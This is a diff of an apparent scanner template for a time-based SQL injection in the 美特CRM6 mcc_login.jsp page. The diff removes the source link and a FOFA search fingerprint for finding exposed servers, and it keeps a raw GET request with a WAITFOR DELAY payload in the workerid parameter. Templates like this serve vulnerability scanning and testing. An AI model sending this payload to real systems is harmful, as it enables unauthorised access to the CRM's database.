@@ -3,12 +3,8 @@ info:
   name: 美特CRM6 mcc_login存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ke2anun6t48ofro5'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ke2anun6t48ofro5
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'GET /si/callcenter/solarun/mcc_login.jsp?workerid=1'';WAITFOR+DELAY+''0:0:5''--+ HTTP/1.1
